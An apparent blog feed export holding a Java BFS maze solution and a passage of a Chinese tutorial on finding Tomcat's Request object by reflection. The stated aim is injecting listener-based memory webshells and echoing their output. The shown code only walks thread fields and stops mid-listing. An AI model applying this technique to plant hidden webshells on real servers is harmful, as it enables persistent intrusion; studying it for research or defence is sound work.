<h4 id="输入描述"><a href="#输入描述" class="headerlink" title="输入描述"></a>输入描述</h4><p>第一行输入一个整数n（0&lt;n&lt;&#x3D;100），表示有n组测试数据;<br>随后n行,每行有四个整数a,b,c,d（0&lt;&#x3D;a,b,c,d&lt;&#x3D;8）分别表示起点的行、列，终点的行、列。</p>
<p>输出描述</p>
<p>输出最少走几步。</p>
<h3 id="解题源码"><a href="#解题源码" class="headerlink" title="解题源码"></a>解题源码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OJ58</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="type">int</span>[][] walked =<span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">9</span>][<span class="number">9</span>]; <span class="comment">//记录那些路径走过</span></span><br><span class="line">    <span class="keyword">static</span> Queue&lt;location&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;location&gt;();<span class="comment">//创建队列，将所有的位置都走一遍</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="type">int</span>[][] map=&#123;&#123;<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>&#125;,</span><br><span class="line">            &#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>&#125;,</span><br><span class="line">            &#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>&#125;,</span><br><span class="line">            &#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>&#125;,</span><br><span class="line">            &#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>&#125;,</span><br><span class="line">            &#123;<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>&#125;,</span><br><span class="line">            &#123;<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>&#125;,</span><br><span class="line">            &#123;<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>&#125;,</span><br><span class="line">            &#123;<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>&#125;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">in</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> in.nextInt();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> in.nextInt();</span><br><span class="line">            <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> in.nextInt();</span><br><span class="line">            <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> in.nextInt();</span><br><span class="line">            <span class="type">int</span> <span class="variable">d</span> <span class="operator">=</span> in.nextInt();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (a == c &amp;&amp; b == d) &#123;</span><br><span class="line">                System.out.println(<span class="number">0</span>);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            move(a, b,<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">while</span> (queue.size() != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="type">location</span> <span class="variable">laca</span> <span class="operator">=</span> queue.poll();</span><br><span class="line"><span class="comment">//                System.out.print(&quot;走过(&quot;);</span></span><br><span class="line"><span class="comment">//                System.out.print(laca.x);</span></span><br><span class="line"><span class="comment">//                System.out.print(&quot;,&quot;);</span></span><br><span class="line"><span class="comment">//                System.out.print(laca.y);</span></span><br><span class="line"><span class="comment">//                System.out.print(&quot;)位置&quot;);</span></span><br><span class="line"><span class="comment">//                System.out.print(&quot;，步数&quot;);</span></span><br><span class="line"><span class="comment">//                System.out.println(laca.step);</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (laca.x == c &amp;&amp; laca.y == d) &#123;</span><br><span class="line">                    System.out.println(laca.step);</span><br><span class="line">                    queue.clear();</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">w</span> <span class="operator">=</span> <span class="number">0</span>; w &lt; <span class="number">9</span>; w++) &#123;</span><br><span class="line">                        Arrays.fill(walked[w], <span class="number">0</span>);<span class="comment">//二维数组全部赋值为0</span></span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    move(laca.x,laca.y, laca.step);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">move</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> steps)</span> &#123; <span class="comment">//每个点上下左右移动</span></span><br><span class="line"></span><br><span class="line">        ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">        list.add(<span class="number">1</span>);</span><br><span class="line">        list.add(-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i : list) &#123;</span><br><span class="line">            <span class="keyword">if</span> (x + i &gt; -<span class="number">1</span> &amp;&amp; x + i &lt;= <span class="number">8</span> &amp;&amp; walked[x + i][y] == <span class="number">0</span> &amp;&amp; map[x + i][y] == <span class="number">0</span>) &#123;</span><br><span class="line">                walked[x + i][y] = <span class="number">1</span>;</span><br><span class="line">                <span class="type">location</span> <span class="variable">laca</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">location</span>();</span><br><span class="line">                laca.x = x + i;</span><br><span class="line">                laca.y = y;</span><br><span class="line">                laca.step =steps+<span class="number">1</span>;</span><br><span class="line">                queue.offer(laca);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i : list) &#123;</span><br><span class="line">            <span class="keyword">if</span> (y + i &gt; -<span class="number">1</span> &amp;&amp; y + i &lt;= <span class="number">8</span> &amp;&amp; walked[x][y + i] == <span class="number">0</span> &amp;&amp; map[x][y + i] == <span class="number">0</span>) &#123;</span><br><span class="line">                walked[x][y + i] = <span class="number">1</span>;</span><br><span class="line">                <span class="type">location</span> <span class="variable">laca</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">location</span>();</span><br><span class="line">                laca.x = x;</span><br><span class="line">                laca.y = y+i;</span><br><span class="line">                laca.step = steps+<span class="number">1</span>;</span><br><span class="line">                queue.offer(laca);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">location</span> &#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="type">int</span> y;</span><br><span class="line">    <span class="type">int</span> step;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h3><h4 id="java结构体"><a href="#java结构体" class="headerlink" title="java结构体"></a>java结构体</h4><p>java没有结构体，Queue<E> E是泛型 可以自己构建类去充当元素，使用object &#x3D;null去释放赋值对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Interface Queue&lt;E&gt;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">location</span> &#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="type">int</span> y;</span><br><span class="line">    <span class="type">int</span> step;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">location</span> <span class="variable">laca</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">location</span>();</span><br><span class="line">queue.offer(laca);</span><br></pre></td></tr></table></figure>
<hr>
<h4 id="多维数组赋值为0"><a href="#多维数组赋值为0" class="headerlink" title="多维数组赋值为0"></a>多维数组赋值为0</h4><p>java.util.Arrays.fill()方法处理的是一维数组，处理二维数组使用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">w</span> <span class="operator">=</span> <span class="number">0</span>; w &lt; <span class="number">9</span>; w++) &#123;</span><br><span class="line">    Arrays.fill(walked[w], <span class="number">0</span>);<span class="comment">//二维数组全部赋值为0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h4 id="心得"><a href="#心得" class="headerlink" title="心得"></a>心得</h4><p>广度优先搜索可以解决最短路径问题，像火一样蔓延，一层层去查找。</p>
]]></content>
      <categories>
        <category>OJ</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>java内存马回显初探</title>
    <url>/2023/03/06/java%E5%86%85%E5%AD%98%E9%A9%AC%E5%9B%9E%E6%98%BE%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h2 id="java内存马回显初探"><a href="#java内存马回显初探" class="headerlink" title="java内存马回显初探"></a>java内存马回显初探</h2><p>在学习java内存马回显时，总是在复现别人的利用链，就想着我们自己该怎么去找构造链呢。在网上找资料的时候发现了<strong><a href="https://github.com/c0ny1/java-object-searcher/">https://github.com/c0ny1/java-object-searcher/</a></strong>,真的非常感谢大神们提供的寻找思路。为了检验之前学习的反射与算法基础，本篇文章详细讲解一下自己写搜索程序的过程。</p>
<span id="more"></span>
<p><strong>环境说明</strong></p>
<ul>
<li>Tomcat&#x2F;8.5.83</li>
<li>java version “1.8.0_152”</li>
<li>idea 2023.3.2</li>
</ul>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>我们再写内存马时，比如写linsener内存马时，需要先获取当前应用的<strong>StandardContext</strong>，回显的时候需要获取当前应用当前进程的<strong>response</strong>。又因为：</p>
<ul>
<li>Request对象可以获取到StandardContext，Request.getContext()。</li>
<li>Request对象也可以获得response，例如tomcat的Request具体实现类org.apache.catalina.connector.Request里面包含<strong>protected Response response;</strong></li>
</ul>
<hr>
<p>所以我们如果能获取到当前访问的<strong>Request</strong>，我们就可以实现写内存马和进行回显。</p>
<h3 id="准备知识"><a href="#准备知识" class="headerlink" title="准备知识"></a>准备知识</h3><h4 id="存储Request的位置"><a href="#存储Request的位置" class="headerlink" title="存储Request的位置"></a>存储Request的位置</h4><p>通常情况下，java-web作为多线程应用，Request对象通常存在在线程里面，我们可以通过<strong>Thread.currentThread()</strong> 来获取到当前的线程对象。<br>例如我们写一个简单的jsp，println的位置下断点，我们通过idea自带的评估表达式（Evaluate），执行Thread.currentThread()看一下。</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;sss&quot;</span>;</span><br><span class="line">    System.out.println(s);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
<p>我们发现获取到的确实是当前线程的对象，他的类型为org.apache.tomcat.util.threads.TaskThread。TaskThread继承了Thread。<br><img src="/2023/03/06/java%E5%86%85%E5%AD%98%E9%A9%AC%E5%9B%9E%E6%98%BE%E5%88%9D%E6%8E%A2/16780848080571.jpg"></p>
<h4 id="反射获取TaskThread里面所有变量"><a href="#反射获取TaskThread里面所有变量" class="headerlink" title="反射获取TaskThread里面所有变量"></a>反射获取TaskThread里面所有变量</h4><p>我们知道反射可以获取对象的字段、字段值、字段类型。反射学习详见：<strong><a href="https://f19t.github.io/2023/02/19/Java%E5%8F%8D%E5%B0%84/">https://f19t.github.io/2023/02/19/Java%E5%8F%8D%E5%B0%84/</a></strong></p>
<p>所以这里我们可以写一个servlet程序获取到TaskThread的所有字段以及字段属性。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.threads.TaskThread;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * author: f19t</span></span><br><span class="line"><span class="comment"> * Date: 2023/3/2 14:52</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@WebServlet(&quot;/simple&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">simple</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">TaskThread</span> <span class="variable">t</span> <span class="operator">=</span> (TaskThread) Thread.currentThread();</span><br><span class="line">        Field fields[] = TaskThread.class.getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; fields.length; i++) &#123;</span><br><span class="line">            fields[i].setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;字段名=&quot;</span>+fields[i].getName());</span><br><span class="line">                System.out.println(<span class="string">&quot;字段值=&quot;</span>+fields[i].get(t));<span class="comment">//get方法需要传入实例对象</span></span><br><span class="line">                System.out.println(<span class="string">&quot;字段类型=&quot;</span>+fields[i].getType());</span><br><span class="line">                <span class="type">int</span> <span class="variable">mod</span> <span class="operator">=</span> fields[i].getModifiers();</span><br><span class="line">                System.out.println(<span class="string">&quot;声明类型=&quot;</span>+ Modifier.toString(mod));</span><br><span class="line">                System.out.println(<span class="string">&quot;----------------------------&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">          </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输出：</span><br><span class="line">字段名=log</span><br><span class="line">字段值=org.apache.juli.logging.DirectJDKLog@397d3266</span><br><span class="line">字段类型=<span class="keyword">interface</span> <span class="title class_">org</span>.apache.juli.logging.Log</span><br><span class="line">声明类型=<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span></span><br><span class="line">----------------------------</span><br><span class="line">字段名=creationTime</span><br><span class="line">字段值=<span class="number">1677745450986</span></span><br><span class="line">字段类型=<span class="type">long</span></span><br><span class="line">声明类型=<span class="keyword">private</span> <span class="keyword">final</span></span><br></pre></td></tr></table></figure>
<p>为什么只输出了两个字段呢，那是因为TaskThread类里面确实只有这两个字段，但是我们调试的时候发现TaskThread里面有很多字段呀，这是因为TaskThread继承一些父类，我们要想获得TaskThread的所有字段，还得去遍历他们的父类,为了方便查看字段在哪个类里面，我们也打印一下类名。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.threads.TaskThread;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * author: f19t</span></span><br><span class="line"><span class="comment"> * Date: 2023/3/2 14:52</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@WebServlet(&quot;/simple&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">simple</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">TaskThread</span> <span class="variable">t</span> <span class="operator">=</span> (TaskThread) Thread.currentThread();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.tomcat.util.threads.TaskThread&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (; clazz != Object.class; clazz = clazz.getSuperclass()) &#123;</span><br><span class="line">                Field fields[] = clazz.getDeclaredFields();</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; fields.length; i++) &#123;</span><br><span class="line">                    fields[i].setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    System.out.println(<span class="string">&quot;类名=&quot;</span> + clazz);</span><br><span class="line">                    System.out.println(<span class="string">&quot;字段名=&quot;</span>+fields[i].getName());</span><br><span class="line">                    System.out.println(<span class="string">&quot;字段类型=&quot;</span>+fields[i].getType());</span><br><span class="line">                    <span class="type">int</span> <span class="variable">mod</span> <span class="operator">=</span> fields[i].getModifiers();</span><br><span class="line">                    System.out.println(<span class="string">&quot;声明类型=&quot;</span>+ Modifier.toString(mod));</span><br><span class="line">                    System.out.println(<span class="string">&quot;字段值=&quot;</span>+fields[i].get(t));<span class="comment">//get方法需要传入实例对象</span></span><br><span class="line">                    System.out.println(<span class="string">&quot;----------------------------&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">结果：</span><br><span class="line">类名=<span class="keyword">class</span> <span class="title class_">org</span>.apache.tomcat.util.threads.TaskThread</span><br><span class="line">字段名=log</span><br><span class="line">字段类型=<span class="keyword">interface</span> <span class="title class_">org</span>.apache.juli.logging.Log</span><br><span class="line">声明类型=<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span></span><br><span class="line">字段值=org.apache.juli.logging.DirectJDKLog@21d6ac54</span><br><span class="line">----------------------------</span><br><span class="line">类名=<span class="keyword">class</span> <span class="title class_">org</span>.apache.tomcat.util.threads.TaskThread</span><br><span class="line">字段名=creationTime</span><br><span class="line">字段类型=<span class="type">long</span></span><br><span class="line">声明类型=<span class="keyword">private</span> <span class="keyword">final</span></span><br><span class="line">字段值=<span class="number">1677750206025</span></span><br><span class="line">----------------------------</span><br><span class="line">类名=<span class="keyword">class</span> <span class="title class_">java</span>.lang.Thread</span><br><span class="line">字段名=name</span><br><span class="line">字段类型=<span class="keyword">class</span> <span class="title class_">java</span>.lang.String</span><br><span class="line">声明类型=<span class="keyword">private</span> <span class="keyword">volatile</span></span><br><span class="line">字段值=http-nio-<span class="number">8080</span>-exec-<span class="number">5</span></span><br><span class="line">----------------------------</span><br><span class="line">类名=<span class="keyword">class</span> <span class="title class_">java</span>.lang.Thread</span><br><span class="line">字段名=priority</span><br><span class="line">字段类型=<span class="type">int</span></span><br><span class="line">声明类型=<span class="keyword">private</span></span><br><span class="line">字段值=<span class="number">5</span></span><br><span class="line">----------------------------</span><br><span class="line">........</span><br><span class="line">........后面字段省略</span><br></pre></td></tr></table></figure>

<p>到这里我们获取了所有TaskThread的字段，字段的种类有很多我们需筛选，显然java提供的八种基础类型不是我们需要的。我们需要的类型是<strong>引用数据</strong>类型，也就是可能存在对象或者集合（集合里面可能存在其他类）。<br>这里我们可以创建一个黑名单，在黑名单里面的我们不进行输出。到这里我们的Object的处理逻辑就清晰了，先判断是否是黑名单，如果是普通对象那么就进行取值，如果是集合类型或者是数组类型的我们将数组内的所有值都取出来。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//黑名单</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isblack</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">Boolean</span> <span class="variable">aBoolean</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        List&lt;String&gt; black = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;(Arrays.asList(<span class="string">&quot;java.lang.Byte&quot;</span>,</span><br><span class="line">                <span class="string">&quot;java.lang.Short&quot;</span>,</span><br><span class="line">                <span class="string">&quot;java.lang.Integer&quot;</span>,</span><br><span class="line">                <span class="string">&quot;java.lang.Long&quot;</span>,</span><br><span class="line">                <span class="string">&quot;java.lang.Float&quot;</span>,</span><br><span class="line">                <span class="string">&quot;java.lang.Boolean&quot;</span>,</span><br><span class="line">                <span class="string">&quot;java.lang.String&quot;</span>,</span><br><span class="line">                <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">                <span class="string">&quot;java.lang.Character&quot;</span>,</span><br><span class="line">                <span class="string">&quot;java.io.File&quot;</span>,</span><br><span class="line">                <span class="string">&quot;byte&quot;</span>,</span><br><span class="line">                <span class="string">&quot;short&quot;</span>,</span><br><span class="line">                <span class="string">&quot;int&quot;</span>,</span><br><span class="line">                <span class="string">&quot;long&quot;</span>,</span><br><span class="line">                <span class="string">&quot;double&quot;</span>,</span><br><span class="line">                <span class="string">&quot;float&quot;</span>,</span><br><span class="line">                <span class="string">&quot;boolean&quot;</span></span><br><span class="line">        ));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; black.size(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s == black.get(i)) &#123;</span><br><span class="line">                aBoolean = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">return</span> aBoolean;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> aBoolean;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//判断list</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">is_list</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">b</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;List&quot;</span>.equals(s) || <span class="string">&quot;ArrayList&quot;</span>.equals(s))&#123;</span><br><span class="line">            b = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">return</span> b;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//判断map</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">is_map</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">b</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;Map&quot;</span>.equals(s) || <span class="string">&quot;HashMap&quot;</span>.equals(s))&#123;</span><br><span class="line">            b = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">return</span> b;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里我们使用广度优先搜索算法去遍历所有的变量。这里我们定义一个类似于c语言结构体的类，用来存储状态。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">location</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">location</span><span class="params">(Object obj, String clazz, String path)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.obj = obj;</span><br><span class="line">        <span class="built_in">this</span>.path = path;</span><br><span class="line">        <span class="built_in">this</span>.clazz = clazz;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Object obj;</span><br><span class="line">    <span class="keyword">public</span> String path;</span><br><span class="line">    <span class="keyword">public</span> String clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>既然是广度优先搜索，我们还需要一个队列，表示有哪些需要进行搜索，还需要一个SET，set会记录哪些被搜索过了，防止被重复搜索。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> Queue&lt;location&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;location&gt;();<span class="comment">//队列保证广度优先搜索</span></span><br><span class="line"><span class="keyword">static</span> Set&lt;Object&gt; set = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;Object&gt;();<span class="comment">//set记录哪些对象被搜索过</span></span><br></pre></td></tr></table></figure>
<p>我们再创建一个白名单</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//白名单</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">is_target</span><span class="params">(Field f,Object o)</span> <span class="keyword">throws</span> IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">b</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (                               f.get(o).getClass().isAssignableFrom(Class.forName(<span class="string">&quot;org.apache.catalina.connector.RequestFacade&quot;</span>))</span><br><span class="line">                &amp;&amp; f.get(o).getClass().getName() !=<span class="string">&quot;java.lang.Object&quot;</span></span><br><span class="line">        )&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>


<p>接下来我们设计广度优先搜索的入口：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">search</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">location</span> <span class="variable">laco</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">location</span>(Thread.currentThread(), <span class="string">&quot;org.apache.tomcat.util.threads.TaskThread&quot;</span>,<span class="string">&quot;TaskThread&quot;</span>);</span><br><span class="line">        queue.offer(laco);</span><br><span class="line">        set.add(Thread.currentThread());</span><br><span class="line">        <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (queue.size()&gt;<span class="number">0</span>) &#123;</span><br><span class="line">            i++;</span><br><span class="line">            basic_search.basic_search(queue.poll());</span><br><span class="line">        &#125;</span><br><span class="line">    